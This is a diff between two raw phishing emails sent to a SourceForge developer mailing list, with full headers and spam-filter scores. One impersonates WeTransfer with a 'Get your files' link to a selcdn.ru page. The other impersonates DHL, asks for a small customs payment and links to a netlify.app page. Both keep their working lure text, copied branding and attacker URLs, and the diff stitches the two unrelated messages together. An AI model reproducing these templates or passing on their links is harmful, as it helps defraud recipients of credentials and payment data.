@@ -2,94 +2,72 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id E47DE44FDD9
-	for <lists+industrypack-devel@lfdr.de>; Mon, 15 Nov 2021 05:18:43 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 5E83745253C
+	for <lists+industrypack-devel@lfdr.de>; Tue, 16 Nov 2021 02:46:11 +0100 (CET)
 Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
 	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1mmTS6-0000VO-GW
-	for lists+industrypack-devel@lfdr.de; Mon, 15 Nov 2021 04:18:42 +0000
+	id 1mmnY1-0004Zz-VW
+	for lists+industrypack-devel@lfdr.de; Tue, 16 Nov 2021 01:46:09 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
- (envelope-from <support@courier-globals.rest>) id 1mmTS4-0000VD-RC
- for industrypack-devel@lists.sourceforge.net; Mon, 15 Nov 2021 04:18:40 +0000
+ (envelope-from <no-replie@dhl.com>) id 1mmnY0-0004Zt-Ai
+ for industrypack-devel@lists.sourceforge.net; Tue, 16 Nov 2021 01:46:08 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+ d=sourceforge.net; s=x; h=Reply-To:Date:From:To:Subject:MIME-Version:
+ Content-Type:Sender:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=Z9D9nej7HSBU3xTxgsJ83bRjVl/oEYDJ26xtfXMT97A=; b=dA7s9miAD2E3AqvP+1+RUC/3q3
- LmMJABeiAPGddYOZqo332uDAlhp3BdS44Quovh5wNRDrtxPj/UEvG3mMIZLkNAes3nnkGGmcQfqFy
- uK0WjLsRF6Q031+Lw/dqvrv0BfeQ92e2YYeGHl7Wwk66bHhtTVB/NLV00MnW8eIr1QG0=;
+ bh=59U/d7yS0kX8Nakn6POpOs7H4YQqLuXqBI0zG4QThuY=; b=U1KB4RI+fEUeFp4AakH3CMTj8B
+ dGvqw0APVhck41tuXnjYUJZTOFmof5r+f45+8nVJqqst1lAkKpp3tQstIgfORBAe47b9SRZqoYTPb
+ jbew0YWgapHdsOXbirBuJ4fHHUrVk5f+1XaW23Vs7brUGbjEdkWCah3jYQklOoR3Lx/4=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
- Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
- :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Reply-To:Date:From:To:Subject:MIME-Version:Content-Type:Sender:Message-ID
+ :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
+ Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=Z9D9nej7HSBU3xTxgsJ83bRjVl/oEYDJ26xtfXMT97A=; b=l
- UnOpp/ThvKNxaXowKRj+ar5ddG0yk65DaoYucCH8yHsn6uIsQjk96tu9S7lD427tHUPh09+mTYHMq
- HfW6sxgDG6ks/Xxclbu3RjQ02r5/nRgBzzcNTn7hMRMjsfLnwLDi0u/pQZdRE3nqOzXGj8cLbZN3z
- 6/S0vuhTVGWaZ50o=;
-Received: from mana0.courier-globals.rest ([128.199.118.21])
- by sfi-mx-1.v28.lw.sourceforge.com with esmtps
+ List-Owner:List-Archive; bh=59U/d7yS0kX8Nakn6POpOs7H4YQqLuXqBI0zG4QThuY=; b=S
+ PzNgxn3f9vApfMrwe0dpTOlYeMrLilk+hAeyJp0PrsGW3prf2xKvhtfy9KwAxSB1uGeiiQCP8iYV/
+ tTNMHmXzjkJcs3PaA8hAXwl31w56xeiqork/EjWHlSy6guYSlGup8J0BlMz1aknzyhUIB1srDI8JK
+ Kfnz3oPzMbWqttB0=;
+Received: from [147.182.220.252] (helo=hp0.dmxaxim.bar)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
- id 1mmTS2-00DK8m-34
- for industrypack-devel@lists.sourceforge.net; Mon, 15 Nov 2021 04:18:40 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
- d=courier-globals.rest; 
- h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
- Content-Transfer-Encoding; i=support@courier-globals.rest;
- bh=Z9D9nej7HSBU3xTxgsJ83bRjVl/oEYDJ26xtfXMT97A=;
- b=yezLt/ak3x04W02UgNL6boQ0tK3mqblSJQtXW/kDjErwN8b4oJd5Fa64578r9cVfq1xmDMGKEk7S
- 8tglg8fQNOxkVFqWZ+njbGhJ8t+qUq0oAguL+gZXv0G/UflakZwRnFpnEaGZz2IQrpFq8ccQ/OaC
- fWkYgRfmbZq0MGypwtQ=
-To: industrypack-devel@lists.sourceforge.net
-Date: 15 Nov 2021 03:58:13 +0000
-Message-ID: <20211115035813.10E8818B0FCB559A@courier-globals.rest>
+ id 1mmnXw-00036c-Gl
+ for industrypack-devel@lists.sourceforge.net; Tue, 16 Nov 2021 01:46:08 +0000
 MIME-Version: 1.0
-X-Spam-Score: 4.4 (++++)
-X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
- has NOT identified this incoming email as spam.  The original
+To: industrypack-devel@lists.sourceforge.net
+Date: Tue, 16 Nov 2021 03:28:59 +0200
+X-Spam-Score: 6.9 (++++++)
+X-Spam-Report: Spam detection software,
+ running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+ has identified this incoming email as possible spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- 
- Content preview:  industrypack-devel@lists.sourceforge.net You received some
-    files via wetransfer 3 items, 101 MB in total · Expires on 17th Nov. 2021
-    Get your files Download link https://wetransfer.com/downloads/951 [...] 
- 
- Content analysis details:   (4.4 points, 6.0 required)
- 
-  pts rule name              description
+ Content preview:  Your package #SHZ27395 is waiting for delivery. Important
+ message! In order to complete the delivery of your package #SHZ27395 , please
+ confirm the payment (1.99 CHF). Online confirmation must be mad [...] 
+ Content analysis details:   (6.9 points, 6.0 required)
+ pts rule name              description
  ---- ---------------------- --------------------------------------------------
-  3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
-                             [128.199.118.21 listed in zen.spamhaus.org]
-  0.1 URIBL_CSS_A            Contains URL's A record listed in the Spamhaus CSS
-                             blocklist
-                             [URIs: courier-globals.rest]
-  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- -0.0 SPF_PASS               SPF: sender matches SPF record
-  0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
-  0.0 HTML_MESSAGE           BODY: HTML included in message
-  0.1 HTTPS_HTTP_MISMATCH    BODY: No description available.
-  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
-  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
-                             valid
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
-                             author's domain
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
-                             envelope-from domain
-  0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
-                             Colors in HTML
-  0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML
-                             tag
-X-Headers-End: 1mmTS2-00DK8m-34
-Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net: You
- received some files via WeTransfer
+ 1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
+ [URIs: netlify.app]
+ 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
+ 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in
+ digit [pangsheng79[at]gmail.com]
+ 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 0.1 MISSING_MID            Missing Message-Id: header
+ 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
+ 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
+ 0.0 FROM_MISSP_EH_MATCH    From misspaced, matches envelope
+X-Headers-End: 1mmnXw-00036c-Gl
+Subject: [Industrypack-devel] Your Parcel Delivery Notice!
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -101,362 +79,398 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-From: WeTransfer via Industrypack-devel
+From: DHL INTERNATIONAL via Industrypack-devel
  <industrypack-devel@lists.sourceforge.net>
-Reply-To: WeTransfer <support@courier-globals.rest>
-Content-Type: multipart/mixed; boundary="===============1944366079469917490=="
+Reply-To: DHL INTERNATIONAL <pangsheng79@gmail.com>
+Cc: DHL INTERNATIONAL <no-replie@dhl.com>
+Content-Type: multipart/mixed; boundary="===============6364347772763992388=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
+Message-Id: <E1mmnY1-0004Zz-VW@sfs-ml-4.v29.lw.sourceforge.com>
 
---===============1944366079469917490==
-Content-Type: text/html
+You will not see this in a MIME-aware mail reader.
+--===============6364347772763992388==
+Content-Type: multipart/alternative; boundary="===============1716599118=="
+
+You will not see this in a MIME-aware mail reader.
+--===============1716599118==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
 
-<div class=3D"ydp783f8cc8yahoo-style-wrap" style=3D"font-family: Helvetica =
-Neue, Helvetica, Arial, sans-serif; font-size: 13px;">
-<div id=3D"ydp783f8cc8yiv9880020113">
-<div>
-<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yahoo-style-wrap" style=3D=
-"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: 13px=
+  =
+
+    =
+
+    	 =
+
+   =
+
+     	  =
+
+   	 	 =
+
+   	   	 =
+
+   	 =
+
+  	 =
+
+   =
+
+     	  =
+
+    =
+
+     	 =
+
+   =
+
+     	 	 =
+
+    Your package #SHZ27395 is waiting for delivery. =
+
+ Important message!
+   In order to complete the delivery of your package #SHZ27395 , please con=
+firm the payment (1.99 CHF). Online confirmation must be made within the ne=
+xt 14 days, before it expires.
+  =
+
+ =
+
+   Deliver My Package >> =
+
+  =
+
+  	 =
+
+   =
+
+    Kind regards,
+ DHL Tracking services. 	 =
+
+    	 =
+
+   	 =
+
+   	 =
+
+   	   	 =
+
+   	 =
+
+   =
+
+   	 	 	 =
+
+    	   2021 =A9 DHL International GmbH. All rights reserved.
+ =
+
+	   	 =
+
+  	 	 	 =
+
+   	 =
+
+    	 =
+
+   	 =
+
+   =20
+--===============1716599118==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10240.16384">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div class=3D"moz-text-html" lang=3D"x-unicode">
+		=
+
+		=
+
+		=
+
+		=
+
+		=
+
+	=
+
+	=
+
+		<table width=3D"100%" id=3D"background-table" style=3D"background-color: =
+rgb(255, 255, 255);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+			<tbody>
+				<tr style=3D"border-collapse: collapse;">
+					<td align=3D"center" style=3D"font-family: Arial, Helvetica, Geneva, s=
+ans-serif; border-collapse: collapse;" bgcolor=3D"#ffffff">
+						<table width=3D"640" class=3D"w640" style=3D"margin: 0px 10px;" borde=
+r=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+							<tbody>
+								<tr style=3D"border-collapse: collapse;">
+									<td width=3D"640" height=3D"20" align=3D"center" class=3D"w640" st=
+yle=3D"font: 11px/18px Arial, Helvetica, sans-serif; font-size-adjust: none=
+; font-stretch: normal;">&nbsp;</td>
+								</tr>
+								<tr style=3D"border-collapse: collapse;">
+									<td width=3D"640" align=3D"center" class=3D"w640" id=3D"header" st=
+yle=3D"font-family: Arial, Helvetica, Geneva, sans-serif; border-collapse: =
+collapse;" bgcolor=3D"#ffffff">
+										<table width=3D"640" class=3D"w640" id=3D"top-bar" bgcolor=3D"#ff=
+ffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+											<tbody>
+												<tr>
+													<td width=3D"15" class=3D"w15">&nbsp;
+														</td>
+													<td align=3D"left" class=3D"w325" valign=3D"middle">
+														<table width=3D"610" align=3D"left" class=3D"w640" border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0">
+															<tbody>
+																<tr>
+																	<td width=3D"390" align=3D"left" class=3D"w420"><img width=
+=3D"630" align=3D"middle" src=3D"https://i.imgur.com/39RlDQT.png" shrinktof=
+it=3D"true"></td>
+																  <td width=3D"130" align=3D"center" class=3D"w140" valign=
+=3D"middle"></td>
+																</tr>
+															</tbody>
+														</table>
+													</td>
+													<td width=3D"15" class=3D"w15">&nbsp;
+														</td>
+												</tr>
+											</tbody>
+										</table>
+									</td>
+								</tr>
+								<tr style=3D"border-collapse: collapse;">
+									<td width=3D"640" height=3D"10" class=3D"w640" style=3D"font-famil=
+y: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+								</tr>
+								<tr id=3D"twocolumn-content-row" style=3D"border-collapse: collapse=
 ;">
-<div id=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121">
-<div>
-<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-style-w=
-rap" style=3D"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; fo=
-nt-size: 13px;">
-<div dir=3D"ltr">
-<div>
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; color: #2c363a; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; letter-spac=
-ing: normal; text-align: left; text-transform: none; white-space: normal; w=
-ord-spacing: 0px; background-color: #ffffff; text-decoration-style: initial=
-; text-decoration-color: initial; margin: 0px; padding: 0px; width: 784px; =
-table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" c=
-ellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 55px 0px 0px; width: 784px;" align=3D"le=
-ft" valign=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 784px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 784px; font-size: 10px;" ali=
-gn=3D"left" valign=3D"top" bgcolor=3D"#409fff"><center>
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px auto; padding: 0px; table-la=
-yout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpaddi=
-ng=3D"0" align=3D"center">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 0px; min-height: 16px;" alig=
-n=3D"left" valign=3D"top">&nbsp;</td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 0px;" align=3D"left" valign=
-=3D"top">&nbsp;</td>
-</tr>
-</tbody>
-</table>
-</center></td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-</tbody>
-</table>
-<p style=3D"margin-top: 0px; color: #2c363a; font-family: Roboto, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; letter-spacing: n=
-ormal; text-align: left; text-indent: 0px; text-transform: none; white-spac=
-e: normal; word-spacing: 0px; background-color: #ffffff; text-decoration-st=
-yle: initial; text-decoration-color: initial;">&nbsp;</p>
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; color: #2c363a; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; letter-spac=
-ing: normal; text-align: left; text-transform: none; white-space: normal; w=
-ord-spacing: 0px; text-decoration-style: initial; text-decoration-color: in=
-itial; margin: 0px; padding: 0px; width: 784px; table-layout: fixed; border=
--spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" bgcolor=3D=
-"white">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 784px;" align=3D"left" valig=
-n=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 784px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 784px;" align=3D"left" valig=
-n=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 784px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 60px 80px 0px; width: 784px; color: #171=
-81a; line-height: 30px; font-family: Arial, sans-serif; font-size: 26px; fo=
-nt-style: normal; font-weight: normal; word-spacing: 0px;" align=3D"center"=
- valign=3D"top">
-<h2 class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydpc77f4e7fv1s=
-ubject" style=3D"margin-top: 0px; font-weight: bold; line-height: 1.2; font=
--size: 1.5em;">industrypack-devel@lists.sourceforge.net</h2>
-<br />You received some files via wetransfer</td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 20px 80px 0px; width: 784px; color: #6a6=
-d70; line-height: 23px; font-family: Arial, sans-serif; font-size: 14px; fo=
-nt-style: normal; font-weight: normal; word-spacing: 0px;" align=3D"center"=
- valign=3D"top">3 items, 101 MB in total &middot; Expires on 17th Nov. 2021=
-</td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 40px 160px 0px; width: 784px;" align=3D"=
-left" valign=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 464px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 464px;" align=3D"left" valig=
-n=3D"top"><a style=3D"color: white; text-decoration-line: none; text-decora=
-tion-style: solid; text-decoration-color: currentcolor; background-color: #=
-409fff; padding: 15px 20px; text-align: center; font-family: Pro Arial, san=
-s-serif; font-size: 14px; font-style: normal; word-spacing: 0px; display: b=
-lock; border-radius: 25px;" href=3D"https://610207.selcdn.ru/strauss/viewin=
-dex.html#industrypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D=
-"nofollow noopener">Get your files</a></td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 40px 80px 0px; width: 784px;" align=3D"l=
-eft" valign=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 624px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px; width: 624px; line-height: 0; font-=
-size: 1px; border-bottom: 2px solid #f4f4f4;" align=3D"left" valign=3D"top"=
->&nbsp;</td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 50px 80px 0px; width: 784px; color: #797=
-c7f; line-height: 24px; font-family: Arial, sans-serif; font-size: 14px; fo=
-nt-style: normal; font-weight: normal; word-spacing: 0px;" align=3D"left" v=
-align=3D"top"><span style=3D"color: #17181a; font-family: Arial, sans-serif=
-, serif, EmojiFont; font-size: 18px; font-weight: 500;">Download link</span=
-><br /><a style=3D"color: #17181a; text-decoration-line: underline; text-de=
-coration-style: solid; text-decoration-color: currentcolor; background-colo=
-r: transparent; font-family: Pro Arial, sans-serif; font-weight: normal;" h=
-ref=3D"https://610207.selcdn.ru/strauss/viewindex.html#industrypack-devel@l=
-ists.sourceforge.net" target=3D"_blank" rel=3D"nofollow noopener"><span sty=
-le=3D"color: #409fff; font-weight: normal; text-decoration-line: underline;=
- text-decoration-style: solid; text-decoration-color: currentcolor;">https:=
-//<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydpc77f4e7=
-fv1v1marky67ace8m6">wetransfer</span>.com/downloads/95153613ffb5af6705eaaab=
-73abb9c2f20200622103720/520bdbac9de5b6d32d08cd5d0c842cd220200622103757/d55a=
-f0</span></a></td>
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 50px 80px 0px; width: 784px; color: #797=
-c7f; line-height: 24px; font-family: Arial, sans-serif; font-size: 14px; fo=
-nt-style: normal; font-weight: normal; word-spacing: 0px;" align=3D"left" v=
-align=3D"top"><span style=3D"color: #17181a; font-family: Arial, sans-serif=
-, serif, EmojiFont; font-size: 18px; font-weight: 500;">3 items</span></td>=
+									<td width=3D"640" class=3D"w640" style=3D"background: rgb(247, 247=
+, 247); font-family: Arial, Helvetica, Geneva, sans-serif; border-top-color=
+: rgb(204, 0, 0); border-top-width: 5px; border-top-style: solid;">
+										<table width=3D"640" class=3D"w640" style=3D"border-top-color: rg=
+b(0, 0, 0); border-top-width: 5px; border-top-style: solid;" border=3D"0" c=
+ellspacing=3D"0" cellpadding=3D"0">
+											<tbody>
+												<tr style=3D"border-collapse: collapse;">
+													<td width=3D"15" class=3D"w15" style=3D"font-family: Arial, He=
+lvetica, Geneva, sans-serif; border-collapse: collapse;" bgcolor=3D"#f7f7f7=
+">&nbsp;
+														</td>
+													<td width=3D"610" class=3D"w610" valign=3D"top" style=3D"font-=
+family: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;" b=
+gcolor=3D"#f7f7f7">
+														<table width=3D"610" class=3D"w610" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0">
+															<tbody>
+																<tr style=3D"border-collapse: collapse;">
+																	<td width=3D"610" class=3D"w610" style=3D"font-family: Ari=
+al, Helvetica, Geneva, sans-serif; border-collapse: collapse;">
+																		<table width=3D"610" class=3D"w610" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0">
+																			<tbody>
+																				<tr>
+																					<td width=3D"610" height=3D"15" class=3D"w610" style=
+=3D"font-family: Arial, Helvetica, Geneva, sans-serif; border-collapse: col=
+lapse;">&nbsp;
+																						</td>
+																				</tr>
+																				<tr style=3D"border-collapse: collapse;">
+																					<td width=3D"610" class=3D"w610" style=3D"font-family:=
+ Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;">
+																						<table align=3D"right" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+																							<tbody>
+																								<tr style=3D"border-collapse: collapse;">
+																									<td width=3D"20" height=3D"20" align=3D"center" cl=
+ass=3D"w30" valign=3D"top">&nbsp;																								  </td>
+																									<td align=3D"center" style=3D"padding: 0px 0px 10p=
+x;"><img width=3D"150" src=3D"https://upload.wikimedia.org/wikipedia/common=
+s/8/81/Logo_Deutsche_Post_DHL.svg" shrinktofit=3D"true"></td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<div align=3D"left" class=3D"article-content" style=
+=3D"color: rgb(68, 68, 68); line-height: 18px; font-family: Arial, Helvetic=
+a, sans-serif; font-size: 11px; margin-bottom: 15px;">
+																						  <p class=3D"article-title" style=3D"color: rgb(68, =
+68, 68); line-height: 22px; font-family: Arial, Helvetica, Geneva, sans-ser=
+if; font-size: 18px; font-weight: bold; margin-top: 15px; margin-bottom: 15=
+px;">Your pac<font>kage <a href=3D"https://friendly-lovelace-073a55.netlify=
+.app/#industrypack-devel@lists.sourceforge.net">#SHZ27395</a> is waiting fo=
+r del<font>ivery.
+</font></font></p>
+																							=
 
-</tr>
-<tr>
-<td style=3D"margin: 0px; padding: 0px 80px 50px; width: 784px; color: #797=
-c7f; line-height: 24px; font-family: Arial, sans-serif; font-size: 14px; fo=
-nt-style: normal; font-weight: normal; word-spacing: 0px;" align=3D"left" v=
-align=3D"top">
-<div style=3D"color: #17181a; font-family: Arial, sans-serif, serif, EmojiF=
-ont; font-size: 18px; font-weight: 500;">&nbsp;</div>
-<div style=3D"padding: 9px 0px 7px; border-bottom: 1px solid #f4f4f4;">
-<div style=3D"color: #17181a; line-height: 16px; font-family: Arial, sans-s=
-erif, serif, EmojiFont; font-size: 14px; font-style: normal; font-weight: n=
-ormal; word-spacing: 0px;">Purchase Order .pdf</div>
-<div style=3D"color: #6a6d70; line-height: 16px; font-size: 12px;">86.9 MB<=
-/div>
-</div>
-<div style=3D"padding: 9px 0px 7px; border-bottom: 1px solid #f4f4f4;">
-<div style=3D"color: #17181a; line-height: 16px; font-family: Arial, sans-s=
-erif, serif, EmojiFont; font-size: 14px; font-style: normal; font-weight: n=
-ormal; word-spacing: 0px;">List of Items.pdf</div>
-<div style=3D"color: #6a6d70; line-height: 16px; font-size: 12px;">7.83 MB<=
-/div>
-</div>
-<div style=3D"padding: 9px 0px 7px; border-bottom: 1px none #f4f4f4;">
-<div style=3D"color: #17181a; line-height: 16px; font-family: Arial, sans-s=
-erif, serif, EmojiFont; font-size: 14px; font-style: normal; font-weight: n=
-ormal; word-spacing: 0px;">Specifications.pdf</div>
-<div style=3D"color: #6a6d70; line-height: 16px; font-size: 12px;">5.79 MB<=
-/div>
-</div>
-</td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-</tbody>
-</table>
-<p style=3D"margin-top: 0px; color: #2c363a; font-family: Roboto, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; letter-spacing: n=
-ormal; text-align: left; text-indent: 0px; text-transform: none; white-spac=
-e: normal; word-spacing: 0px; background-color: #ffffff; text-decoration-st=
-yle: initial; text-decoration-color: initial;">&nbsp;</p>
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; color: #2c363a; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; letter-spac=
